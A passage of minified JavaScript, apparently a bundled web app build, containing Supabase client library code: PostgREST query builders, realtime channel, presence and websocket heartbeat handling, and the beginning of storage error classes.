i&&i.__esModule?i:{default:i}};Object.defineProperty(xn,"__esModule",{value:!0});const n=a(vd());class s{constructor(o,{headers:c={},schema:d,fetch:m}){this.url=o,this.headers=c,this.schema=d,this.fetch=m}select(o,{head:c=!1,count:d}={}){const m=c?"HEAD":"GET";let f=!1;const x=(o??"*").split("").map(p=>/\s/.test(p)&&!f?"":(p==='"'&&(f=!f),p)).join("");return this.url.searchParams.set("select",x),d&&(this.headers.Prefer=`count=${d}`),new n.default({method:m,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}insert(o,{count:c,defaultToNull:d=!0}={}){const m="POST",f=[];if(this.headers.Prefer&&f.push(this.headers.Prefer),c&&f.push(`count=${c}`),d||f.push("missing=default"),this.headers.Prefer=f.join(","),Array.isArray(o)){const x=o.reduce((p,b)=>p.concat(Object.keys(b)),[]);if(x.length>0){const p=[...new Set(x)].map(b=>`"${b}"`);this.url.searchParams.set("columns",p.join(","))}}return new n.default({method:m,url:this.url,headers:this.headers,schema:this.schema,body:o,fetch:this.fetch,allowEmpty:!1})}upsert(o,{onConflict:c,ignoreDuplicates:d=!1,count:m,defaultToNull:f=!0}={}){const x="POST",p=[`resolution=${d?"ignore":"merge"}-duplicates`];if(c!==void 0&&this.url.searchParams.set("on_conflict",c),this.headers.Prefer&&p.push(this.headers.Prefer),m&&p.push(`count=${m}`),f||p.push("missing=default"),this.headers.Prefer=p.join(","),Array.isArray(o)){const b=o.reduce((w,j)=>w.concat(Object.keys(j)),[]);if(b.length>0){const w=[...new Set(b)].map(j=>`"${j}"`);this.url.searchParams.set("columns",w.join(","))}}return new n.default({method:x,url:this.url,headers:this.headers,schema:this.schema,body:o,fetch:this.fetch,allowEmpty:!1})}update(o,{count:c}={}){const d="PATCH",m=[];return this.headers.Prefer&&m.push(this.headers.Prefer),c&&m.push(`count=${c}`),this.headers.Prefer=m.join(","),new n.default({method:d,url:this.url,headers:this.headers,schema:this.schema,body:o,fetch:this.fetch,allowEmpty:!1})}delete({count:o}={}){const c="DELETE",d=[];return o&&d.push(`count=${o}`),this.headers.Prefer&&d.unshift(this.headers.Prefer),this.headers.Prefer=d.join(","),new n.default({method:c,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}}return xn.default=s,xn}var Aa={},Ea={},Yf;function Eg(){return Yf||(Yf=1,Object.defineProperty(Ea,"__esModule",{value:!0}),Ea.version=void 0,Ea.version="0.0.0-automated"),Ea}var Jf;function Cg(){if(Jf)return Aa;Jf=1,Object.defineProperty(Aa,"__esModule",{value:!0}),Aa.DEFAULT_HEADERS=void 0;const a=Eg();return Aa.DEFAULT_HEADERS={"X-Client-Info":`postgrest-js/${a.version}`},Aa}var Xf;function Tg(){if(Xf)return pn;Xf=1;var a=pn&&pn.__importDefault||function(c){return c&&c.__esModule?c:{default:c}};Object.defineProperty(pn,"__esModule",{value:!0});const n=a(e0()),s=a(vd()),i=Cg();class o{constructor(d,{headers:m={},schema:f,fetch:x}={}){this.url=d,this.headers=Object.assign(Object.assign({},i.DEFAULT_HEADERS),m),this.schemaName=f,this.fetch=x}from(d){const m=new URL(`${this.url}/${d}`);return new n.default(m,{headers:Object.assign({},this.headers),schema:this.schemaName,fetch:this.fetch})}schema(d){return new o(this.url,{headers:this.headers,schema:d,fetch:this.fetch})}rpc(d,m={},{head:f=!1,get:x=!1,count:p}={}){let b;const w=new URL(`${this.url}/rpc/${d}`);let j;f||x?(b=f?"HEAD":"GET",Object.entries(m).filter(([k,F])=>F!==void 0).map(([k,F])=>[k,Array.isArray(F)?`{${F.join(",")}}`:`${F}`]).forEach(([k,F])=>{w.searchParams.append(k,F)})):(b="POST",j=m);const N=Object.assign({},this.headers);return p&&(N.Prefer=`count=${p}`),new s.default({method:b,url:w,headers:N,schema:this.schemaName,body:j,fetch:this.fetch,allowEmpty:!1})}}return pn.default=o,pn}var Zf;function Pg(){if(Zf)return it;Zf=1;var a=it&&it.__importDefault||function(m){return m&&m.__esModule?m:{default:m}};Object.defineProperty(it,"__esModule",{value:!0}),it.PostgrestError=it.PostgrestBuilder=it.PostgrestTransformBuilder=it.PostgrestFilterBuilder=it.PostgrestQueryBuilder=it.PostgrestClient=void 0;const n=a(Tg());it.PostgrestClient=n.default;const s=a(e0());it.PostgrestQueryBuilder=s.default;const i=a(vd());it.PostgrestFilterBuilder=i.default;const o=a(Zm());it.PostgrestTransformBuilder=o.default;const c=a(Xm());it.PostgrestBuilder=c.default;const d=a(Jm());return it.PostgrestError=d.default,it.default={PostgrestClient:n.default,PostgrestQueryBuilder:s.default,PostgrestFilterBuilder:i.default,PostgrestTransformBuilder:o.default,PostgrestBuilder:c.default,PostgrestError:d.default},it}var Rg=Pg();const Ig=Qm(Rg),{PostgrestClient:Lg,PostgrestQueryBuilder:sN,PostgrestFilterBuilder:nN,PostgrestTransformBuilder:aN,PostgrestBuilder:iN,PostgrestError:oN}=Ig;function Og(){if(typeof WebSocket<"u")return WebSocket;if(typeof global.WebSocket<"u")return global.WebSocket;if(typeof window.WebSocket<"u")return window.WebSocket;if(typeof self.WebSocket<"u")return self.WebSocket;throw new Error("`WebSocket` is not supported in this environment")}const Dg=Og(),Mg="2.11.15",$g=`realtime-js/${Mg}`,Bg="1.0.0",t0=1e4,Ug=1e3;var La;(function(a){a[a.connecting=0]="connecting",a[a.open=1]="open",a[a.closing=2]="closing",a[a.closed=3]="closed"})(La||(La={}));var pt;(function(a){a.closed="closed",a.errored="errored",a.joined="joined",a.joining="joining",a.leaving="leaving"})(pt||(pt={}));var ir;(function(a){a.close="phx_close",a.error="phx_error",a.join="phx_join",a.reply="phx_reply",a.leave="phx_leave",a.access_token="access_token"})(ir||(ir={}));var Gc;(function(a){a.websocket="websocket"})(Gc||(Gc={}));var Bs;(function(a){a.Connecting="connecting",a.Open="open",a.Closing="closing",a.Closed="closed"})(Bs||(Bs={}));class zg{constructor(){this.HEADER_LENGTH=1}decode(n,s){return n.constructor===ArrayBuffer?s(this._binaryDecode(n)):s(typeof n=="string"?JSON.parse(n):{})}_binaryDecode(n){const s=new DataView(n),i=new TextDecoder;return this._decodeBroadcast(n,s,i)}_decodeBroadcast(n,s,i){const o=s.getUint8(1),c=s.getUint8(2);let d=this.HEADER_LENGTH+2;const m=i.decode(n.slice(d,d+o));d=d+o;const f=i.decode(n.slice(d,d+c));d=d+c;const x=JSON.parse(i.decode(n.slice(d,n.byteLength)));return{ref:null,topic:m,event:f,payload:x}}}class r0{constructor(n,s){this.callback=n,this.timerCalc=s,this.timer=void 0,this.tries=0,this.callback=n,this.timerCalc=s}reset(){this.tries=0,clearTimeout(this.timer)}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}var Me;(function(a){a.abstime="abstime",a.bool="bool",a.date="date",a.daterange="daterange",a.float4="float4",a.float8="float8",a.int2="int2",a.int4="int4",a.int4range="int4range",a.int8="int8",a.int8range="int8range",a.json="json",a.jsonb="jsonb",a.money="money",a.numeric="numeric",a.oid="oid",a.reltime="reltime",a.text="text",a.time="time",a.timestamp="timestamp",a.timestamptz="timestamptz",a.timetz="timetz",a.tsrange="tsrange",a.tstzrange="tstzrange"})(Me||(Me={}));const em=(a,n,s={})=>{var i;const o=(i=s.skipTypes)!==null&&i!==void 0?i:[];return Object.keys(n).reduce((c,d)=>(c[d]=qg(d,a,n,o),c),{})},qg=(a,n,s,i)=>{const o=n.find(m=>m.name===a),c=o?.type,d=s[a];return c&&!i.includes(c)?s0(c,d):Qc(d)},s0=(a,n)=>{if(a.charAt(0)==="_"){const s=a.slice(1,a.length);return Gg(n,s)}switch(a){case Me.bool:return Wg(n);case Me.float4:case Me.float8:case Me.int2:case Me.int4:case Me.int8:case Me.numeric:case Me.oid:return Vg(n);case Me.json:case Me.jsonb:return Hg(n);case Me.timestamp:return Qg(n);case Me.abstime:case Me.date:case Me.daterange:case Me.int4range:case Me.int8range:case Me.money:case Me.reltime:case Me.text:case Me.time:case Me.timestamptz:case Me.timetz:case Me.tsrange:case Me.tstzrange:return Qc(n);default:return Qc(n)}},Qc=a=>a,Wg=a=>{switch(a){case"t":return!0;case"f":return!1;default:return a}},Vg=a=>{if(typeof a=="string"){const n=parseFloat(a);if(!Number.isNaN(n))return n}return a},Hg=a=>{if(typeof a=="string")try{return JSON.parse(a)}catch(n){return console.log(`JSON parse error: ${n}`),a}return a},Gg=(a,n)=>{if(typeof a!="string")return a;const s=a.length-1,i=a[s];if(a[0]==="{"&&i==="}"){let c;const d=a.slice(1,s);try{c=JSON.parse("["+d+"]")}catch{c=d?d.split(","):[]}return c.map(m=>s0(n,m))}return a},Qg=a=>typeof a=="string"?a.replace(" ","T"):a,n0=a=>{let n=a;return n=n.replace(/^ws/i,"http"),n=n.replace(/(\/socket\/websocket|\/socket|\/websocket)\/?$/i,""),n.replace(/\/+$/,"")};class Sc{constructor(n,s,i={},o=t0){this.channel=n,this.event=s,this.payload=i,this.timeout=o,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(n){this.timeout=n,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(n){this.payload=Object.assign(Object.assign({},this.payload),n)}receive(n,s){var i;return this._hasReceived(n)&&s((i=this.receivedResp)===null||i===void 0?void 0:i.response),this.recHooks.push({status:n,callback:s}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);const n=s=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=s,this._matchReceive(s)};this.channel._on(this.refEvent,{},n),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(n,s){this.refEvent&&this.channel._trigger(this.refEvent,{status:n,response:s})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 0}_matchReceive({status:n,response:s}){this.recHooks.filter(i=>i.status===n).forEach(i=>i.callback(s))}_hasReceived(n){return this.receivedResp&&this.receivedResp.status===n}}var tm;(function(a){a.SYNC="sync",a.JOIN="join",a.LEAVE="leave"})(tm||(tm={}));class Oa{constructor(n,s){this.channel=n,this.state={},this.pendingDiffs=[],this.joinRef=null,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const i=s?.events||{state:"presence_state",diff:"presence_diff"};this.channel._on(i.state,{},o=>{const{onJoin:c,onLeave:d,onSync:m}=this.caller;this.joinRef=this.channel._joinRef(),this.state=Oa.syncState(this.state,o,c,d),this.pendingDiffs.forEach(f=>{this.state=Oa.syncDiff(this.state,f,c,d)}),this.pendingDiffs=[],m()}),this.channel._on(i.diff,{},o=>{const{onJoin:c,onLeave:d,onSync:m}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(o):(this.state=Oa.syncDiff(this.state,o,c,d),m())}),this.onJoin((o,c,d)=>{this.channel._trigger("presence",{event:"join",key:o,currentPresences:c,newPresences:d})}),this.onLeave((o,c,d)=>{this.channel._trigger("presence",{event:"leave",key:o,currentPresences:c,leftPresences:d})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(n,s,i,o){const c=this.cloneDeep(n),d=this.transformState(s),m={},f={};return this.map(c,(x,p)=>{d[x]||(f[x]=p)}),this.map(d,(x,p)=>{const b=c[x];if(b){const w=p.map(F=>F.presence_ref),j=b.map(F=>F.presence_ref),N=p.filter(F=>j.indexOf(F.presence_ref)<0),k=b.filter(F=>w.indexOf(F.presence_ref)<0);N.length>0&&(m[x]=N),k.length>0&&(f[x]=k)}else m[x]=p}),this.syncDiff(c,{joins:m,leaves:f},i,o)}static syncDiff(n,s,i,o){const{joins:c,leaves:d}={joins:this.transformState(s.joins),leaves:this.transformState(s.leaves)};return i||(i=()=>{}),o||(o=()=>{}),this.map(c,(m,f)=>{var x;const p=(x=n[m])!==null&&x!==void 0?x:[];if(n[m]=this.cloneDeep(f),p.length>0){const b=n[m].map(j=>j.presence_ref),w=p.filter(j=>b.indexOf(j.presence_ref)<0);n[m].unshift(...w)}i(m,p,f)}),this.map(d,(m,f)=>{let x=n[m];if(!x)return;const p=f.map(b=>b.presence_ref);x=x.filter(b=>p.indexOf(b.presence_ref)<0),n[m]=x,o(m,x,f),x.length===0&&delete n[m]}),n}static map(n,s){return Object.getOwnPropertyNames(n).map(i=>s(i,n[i]))}static transformState(n){return n=this.cloneDeep(n),Object.getOwnPropertyNames(n).reduce((s,i)=>{const o=n[i];return"metas"in o?s[i]=o.metas.map(c=>(c.presence_ref=c.phx_ref,delete c.phx_ref,delete c.phx_ref_prev,c)):s[i]=o,s},{})}static cloneDeep(n){return JSON.parse(JSON.stringify(n))}onJoin(n){this.caller.onJoin=n}onLeave(n){this.caller.onLeave=n}onSync(n){this.caller.onSync=n}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}var rm;(function(a){a.ALL="*",a.INSERT="INSERT",a.UPDATE="UPDATE",a.DELETE="DELETE"})(rm||(rm={}));var sm;(function(a){a.BROADCAST="broadcast",a.PRESENCE="presence",a.POSTGRES_CHANGES="postgres_changes",a.SYSTEM="system"})(sm||(sm={}));var Pr;(function(a){a.SUBSCRIBED="SUBSCRIBED",a.TIMED_OUT="TIMED_OUT",a.CLOSED="CLOSED",a.CHANNEL_ERROR="CHANNEL_ERROR"})(Pr||(Pr={}));class yd{constructor(n,s={config:{}},i){this.topic=n,this.params=s,this.socket=i,this.bindings={},this.state=pt.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=n.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:""},private:!1},s.config),this.timeout=this.socket.timeout,this.joinPush=new Sc(this,ir.join,this.params,this.timeout),this.rejoinTimer=new r0(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=pt.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(o=>o.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel",`close ${this.topic} ${this._joinRef()}`),this.state=pt.closed,this.socket._remove(this)}),this._onError(o=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,o),this.state=pt.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel",`timeout ${this.topic}`,this.joinPush.timeout),this.state=pt.errored,this.rejoinTimer.scheduleTimeout())}),this._on(ir.reply,{},(o,c)=>{this._trigger(this._replyEventName(c),o)}),this.presence=new Oa(this),this.broadcastEndpointURL=n0(this.socket.endPoint)+"/api/broadcast",this.private=this.params.config.private||!1}subscribe(n,s=this.timeout){var i,o;if(this.socket.isConnected()||this.socket.connect(),this.state==pt.closed){const{config:{broadcast:c,presence:d,private:m}}=this.params;this._onError(p=>n?.(Pr.CHANNEL_ERROR,p)),this._onClose(()=>n?.(Pr.CLOSED));const f={},x={broadcast:c,presence:d,postgres_changes:(o=(i=this.bindings.postgres_changes)===null||i===void 0?void 0:i.map(p=>p.filter))!==null&&o!==void 0?o:[],private:m};this.socket.accessTokenValue&&(f.access_token=this.socket.accessTokenValue),this.updateJoinPayload(Object.assign({config:x},f)),this.joinedOnce=!0,this._rejoin(s),this.joinPush.receive("ok",async({postgres_changes:p})=>{var b;if(this.socket.setAuth(),p===void 0){n?.(Pr.SUBSCRIBED);return}else{const w=this.bindings.postgres_changes,j=(b=w?.length)!==null&&b!==void 0?b:0,N=[];for(let k=0;k<j;k++){const F=w[k],{filter:{event:T,schema:R,table:S,filter:U}}=F,z=p&&p[k];if(z&&z.event===T&&z.schema===R&&z.table===S&&z.filter===U)N.push(Object.assign(Object.assign({},F),{id:z.id}));else{this.unsubscribe(),this.state=pt.errored,n?.(Pr.CHANNEL_ERROR,new Error("mismatch between server and client bindings for postgres changes"));return}}this.bindings.postgres_changes=N,n&&n(Pr.SUBSCRIBED);return}}).receive("error",p=>{this.state=pt.errored,n?.(Pr.CHANNEL_ERROR,new Error(JSON.stringify(Object.values(p).join(", ")||"error")))}).receive("timeout",()=>{n?.(Pr.TIMED_OUT)})}return this}presenceState(){return this.presence.state}async track(n,s={}){return await this.send({type:"presence",event:"track",payload:n},s.timeout||this.timeout)}async untrack(n={}){return await this.send({type:"presence",event:"untrack"},n)}on(n,s,i){return this._on(n,s,i)}async send(n,s={}){var i,o;if(!this._canPush()&&n.type==="broadcast"){const{event:c,payload:d}=n,f={method:"POST",headers:{Authorization:this.socket.accessTokenValue?`Bearer ${this.socket.accessTokenValue}`:"",apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"},body:JSON.stringify({messages:[{topic:this.subTopic,event:c,payload:d,private:this.private}]})};try{const x=await this._fetchWithTimeout(this.broadcastEndpointURL,f,(i=s.timeout)!==null&&i!==void 0?i:this.timeout);return await((o=x.body)===null||o===void 0?void 0:o.cancel()),x.ok?"ok":"error"}catch(x){return x.name==="AbortError"?"timed out":"error"}}else return new Promise(c=>{var d,m,f;const x=this._push(n.type,n,s.timeout||this.timeout);n.type==="broadcast"&&!(!((f=(m=(d=this.params)===null||d===void 0?void 0:d.config)===null||m===void 0?void 0:m.broadcast)===null||f===void 0)&&f.ack)&&c("ok"),x.receive("ok",()=>c("ok")),x.receive("error",()=>c("error")),x.receive("timeout",()=>c("timed out"))})}updateJoinPayload(n){this.joinPush.updatePayload(n)}unsubscribe(n=this.timeout){this.state=pt.leaving;const s=()=>{this.socket.log("channel",`leave ${this.topic}`),this._trigger(ir.close,"leave",this._joinRef())};this.joinPush.destroy();let i=null;return new Promise(o=>{i=new Sc(this,ir.leave,{},n),i.receive("ok",()=>{s(),o("ok")}).receive("timeout",()=>{s(),o("timed out")}).receive("error",()=>{o("error")}),i.send(),this._canPush()||i.trigger("ok",{})}).finally(()=>{i?.destroy()})}teardown(){this.pushBuffer.forEach(n=>n.destroy()),this.rejoinTimer&&clearTimeout(this.rejoinTimer.timer),this.joinPush.destroy()}async _fetchWithTimeout(n,s,i){const o=new AbortController,c=setTimeout(()=>o.abort(),i),d=await this.socket.fetch(n,Object.assign(Object.assign({},s),{signal:o.signal}));return clearTimeout(c),d}_push(n,s,i=this.timeout){if(!this.joinedOnce)throw`tried to push '${n}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;let o=new Sc(this,n,s,i);return this._canPush()?o.send():(o.startTimeout(),this.pushBuffer.push(o)),o}_onMessage(n,s,i){return s}_isMember(n){return this.topic===n}_joinRef(){return this.joinPush.ref}_trigger(n,s,i){var o,c;const d=n.toLocaleLowerCase(),{close:m,error:f,leave:x,join:p}=ir;if(i&&[m,f,x,p].indexOf(d)>=0&&i!==this._joinRef())return;let w=this._onMessage(d,s,i);if(s&&!w)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(d)?(o=this.bindings.postgres_changes)===null||o===void 0||o.filter(j=>{var N,k,F;return((N=j.filter)===null||N===void 0?void 0:N.event)==="*"||((F=(k=j.filter)===null||k===void 0?void 0:k.event)===null||F===void 0?void 0:F.toLocaleLowerCase())===d}).map(j=>j.callback(w,i)):(c=this.bindings[d])===null||c===void 0||c.filter(j=>{var N,k,F,T,R,S;if(["broadcast","presence","postgres_changes"].includes(d))if("id"in j){const U=j.id,z=(N=j.filter)===null||N===void 0?void 0:N.event;return U&&((k=s.ids)===null||k===void 0?void 0:k.includes(U))&&(z==="*"||z?.toLocaleLowerCase()===((F=s.data)===null||F===void 0?void 0:F.type.toLocaleLowerCase()))}else{const U=(R=(T=j?.filter)===null||T===void 0?void 0:T.event)===null||R===void 0?void 0:R.toLocaleLowerCase();return U==="*"||U===((S=s?.event)===null||S===void 0?void 0:S.toLocaleLowerCase())}else return j.type.toLocaleLowerCase()===d}).map(j=>{if(typeof w=="object"&&"ids"in w){const N=w.data,{schema:k,table:F,commit_timestamp:T,type:R,errors:S}=N;w=Object.assign(Object.assign({},{schema:k,table:F,commit_timestamp:T,eventType:R,new:{},old:{},errors:S}),this._getPayloadRecords(N))}j.callback(w,i)})}_isClosed(){return this.state===pt.closed}_isJoined(){return this.state===pt.joined}_isJoining(){return this.state===pt.joining}_isLeaving(){return this.state===pt.leaving}_replyEventName(n){return`chan_reply_${n}`}_on(n,s,i){const o=n.toLocaleLowerCase(),c={type:o,filter:s,callback:i};return this.bindings[o]?this.bindings[o].push(c):this.bindings[o]=[c],this}_off(n,s){const i=n.toLocaleLowerCase();return this.bindings[i]=this.bindings[i].filter(o=>{var c;return!(((c=o.type)===null||c===void 0?void 0:c.toLocaleLowerCase())===i&&yd.isEqual(o.filter,s))}),this}static isEqual(n,s){if(Object.keys(n).length!==Object.keys(s).length)return!1;for(const i in n)if(n[i]!==s[i])return!1;return!0}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(n){this._on(ir.close,{},n)}_onError(n){this._on(ir.error,{},s=>n(s))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(n=this.timeout){this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=pt.joining,this.joinPush.resend(n))}_getPayloadRecords(n){const s={new:{},old:{}};return(n.type==="INSERT"||n.type==="UPDATE")&&(s.new=em(n.columns,n.record)),(n.type==="UPDATE"||n.type==="DELETE")&&(s.old=em(n.columns,n.old_record)),s}}const nm=()=>{},Kg=`
  addEventListener("message", (e) => {
    if (e.data.event === "start") {
      setInterval(() => postMessage({ event: "keepAlive" }), e.data.interval);
    }
  });`;class Yg{constructor(n,s){var i;this.accessTokenValue=null,this.apiKey=null,this.channels=new Array,this.endPoint="",this.httpEndpoint="",this.headers={},this.params={},this.timeout=t0,this.heartbeatIntervalMs=25e3,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.heartbeatCallback=nm,this.ref=0,this.logger=nm,this.conn=null,this.sendBuffer=[],this.serializer=new zg,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this.accessToken=null,this._resolveFetch=c=>{let d;return c?d=c:typeof fetch>"u"?d=(...m)=>pr(async()=>{const{default:f}=await Promise.resolve().then(()=>On);return{default:f}},void 0).then(({default:f})=>f(...m)):d=fetch,(...m)=>d(...m)},this.endPoint=`${n}/${Gc.websocket}`,this.httpEndpoint=n0(n),s?.transport?this.transport=s.transport:this.transport=null,s?.params&&(this.params=s.params),s?.timeout&&(this.timeout=s.timeout),s?.logger&&(this.logger=s.logger),(s?.logLevel||s?.log_level)&&(this.logLevel=s.logLevel||s.log_level,this.params=Object.assign(Object.assign({},this.params),{log_level:this.logLevel})),s?.heartbeatIntervalMs&&(this.heartbeatIntervalMs=s.heartbeatIntervalMs);const o=(i=s?.params)===null||i===void 0?void 0:i.apikey;if(o&&(this.accessTokenValue=o,this.apiKey=o),this.reconnectAfterMs=s?.reconnectAfterMs?s.reconnectAfterMs:c=>[1e3,2e3,5e3,1e4][c-1]||1e4,this.encode=s?.encode?s.encode:(c,d)=>d(JSON.stringify(c)),this.decode=s?.decode?s.decode:this.serializer.decode.bind(this.serializer),this.reconnectTimer=new r0(async()=>{this.disconnect(),this.connect()},this.reconnectAfterMs),this.fetch=this._resolveFetch(s?.fetch),s?.worker){if(typeof window<"u"&&!window.Worker)throw new Error("Web Worker is not supported");this.worker=s?.worker||!1,this.workerUrl=s?.workerUrl}this.accessToken=s?.accessToken||null}connect(){if(!this.conn){if(this.transport||(this.transport=Dg),!this.transport)throw new Error("No transport provided");this.conn=new this.transport(this.endpointURL()),this.setupConnection()}}endpointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:Bg}))}disconnect(n,s){this.conn&&(this.conn.onclose=function(){},n?this.conn.close(n,s??""):this.conn.close(),this.conn=null,this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.reset(),this.channels.forEach(i=>i.teardown()))}getChannels(){return this.channels}async removeChannel(n){const s=await n.unsubscribe();return this.channels.length===0&&this.disconnect(),s}async removeAllChannels(){const n=await Promise.all(this.channels.map(s=>s.unsubscribe()));return this.channels=[],this.disconnect(),n}log(n,s,i){this.logger(n,s,i)}connectionState(){switch(this.conn&&this.conn.readyState){case La.connecting:return Bs.Connecting;case La.open:return Bs.Open;case La.closing:return Bs.Closing;default:return Bs.Closed}}isConnected(){return this.connectionState()===Bs.Open}channel(n,s={config:{}}){const i=`realtime:${n}`,o=this.getChannels().find(c=>c.topic===i);if(o)return o;{const c=new yd(`realtime:${n}`,s,this);return this.channels.push(c),c}}push(n){const{topic:s,event:i,payload:o,ref:c}=n,d=()=>{this.encode(n,m=>{var f;(f=this.conn)===null||f===void 0||f.send(m)})};this.log("push",`${s} ${i} (${c})`,o),this.isConnected()?d():this.sendBuffer.push(d)}async setAuth(n=null){let s=n||this.accessToken&&await this.accessToken()||this.accessTokenValue;this.accessTokenValue!=s&&(this.accessTokenValue=s,this.channels.forEach(i=>{const o={access_token:s,version:$g};s&&i.updateJoinPayload(o),i.joinedOnce&&i._isJoined()&&i._push(ir.access_token,{access_token:s})}))}async sendHeartbeat(){var n;if(!this.isConnected()){this.heartbeatCallback("disconnected");return}if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection"),this.heartbeatCallback("timeout"),(n=this.conn)===null||n===void 0||n.close(Ug,"hearbeat timeout");return}this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef}),this.heartbeatCallback("sent"),await this.setAuth()}onHeartbeat(n){this.heartbeatCallback=n}flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(n=>n()),this.sendBuffer=[])}_makeRef(){let n=this.ref+1;return n===this.ref?this.ref=0:this.ref=n,this.ref.toString()}_leaveOpenTopic(n){let s=this.channels.find(i=>i.topic===n&&(i._isJoined()||i._isJoining()));s&&(this.log("transport",`leaving duplicate topic "${n}"`),s.unsubscribe())}_remove(n){this.channels=this.channels.filter(s=>s.topic!==n.topic)}setupConnection(){this.conn&&(this.conn.binaryType="arraybuffer",this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=n=>this._onConnError(n),this.conn.onmessage=n=>this._onConnMessage(n),this.conn.onclose=n=>this._onConnClose(n))}_onConnMessage(n){this.decode(n.data,s=>{let{topic:i,event:o,payload:c,ref:d}=s;i==="phoenix"&&o==="phx_reply"&&this.heartbeatCallback(s.payload.status=="ok"?"ok":"error"),d&&d===this.pendingHeartbeatRef&&(this.pendingHeartbeatRef=null),this.log("receive",`${c.status||""} ${i} ${o} ${d&&"("+d+")"||""}`,c),Array.from(this.channels).filter(m=>m._isMember(i)).forEach(m=>m._trigger(o,c,d)),this.stateChangeCallbacks.message.forEach(m=>m(s))})}_onConnOpen(){this.log("transport",`connected to ${this.endpointURL()}`),this.flushSendBuffer(),this.reconnectTimer.reset(),this.worker?this.workerRef||this._startWorkerHeartbeat():this._startHeartbeat(),this.stateChangeCallbacks.open.forEach(n=>n())}_startHeartbeat(){this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this.sendHeartbeat(),this.heartbeatIntervalMs)}_startWorkerHeartbeat(){this.workerUrl?this.log("worker",`starting worker for from ${this.workerUrl}`):this.log("worker","starting default worker");const n=this._workerObjectUrl(this.workerUrl);this.workerRef=new Worker(n),this.workerRef.onerror=s=>{this.log("worker","worker error",s.message),this.workerRef.terminate()},this.workerRef.onmessage=s=>{s.data.event==="keepAlive"&&this.sendHeartbeat()},this.workerRef.postMessage({event:"start",interval:this.heartbeatIntervalMs})}_onConnClose(n){this.log("transport","close",n),this._triggerChanError(),this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.scheduleTimeout(),this.stateChangeCallbacks.close.forEach(s=>s(n))}_onConnError(n){this.log("transport",`${n}`),this._triggerChanError(),this.stateChangeCallbacks.error.forEach(s=>s(n))}_triggerChanError(){this.channels.forEach(n=>n._trigger(ir.error))}_appendParams(n,s){if(Object.keys(s).length===0)return n;const i=n.match(/\?/)?"&":"?",o=new URLSearchParams(s);return`${n}${i}${o}`}_workerObjectUrl(n){let s;if(n)s=n;else{const i=new Blob([Kg],{type:"application/javascript"});s=URL.createObjectURL(i)}return s}}class wd extends Error{constructor(n){super(n),this.__isStorageError=!0,this.name="StorageError"}}function ot(a){return typeof a=="object"&&a!==null&&"__isStorageError"in a}class Jg extends wd{constructor(n,s){super(n),this.name="StorageApiError",this.status=s}toJSON(){return{name:this.name,message:this.message,status:this.status}}}class Kc extends wd{constructor(n,s){super(n),this.name="StorageUnknownError",this.originalError=s}}var Xg=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};const a0=a=>{let n;return a?n=a:typeof fetch>"u"?n=(...s)=>pr(async()=>{const{default:i}=await Promise.resolve().then(()=>On);return{default:i}},void 0).then(({default:i})=>i(...s)):n=fetch,(...s)=>n(...s)},Zg=()=>Xg(void 0,void 0,void 0,function*(){return typeof Response>"u"?(yield 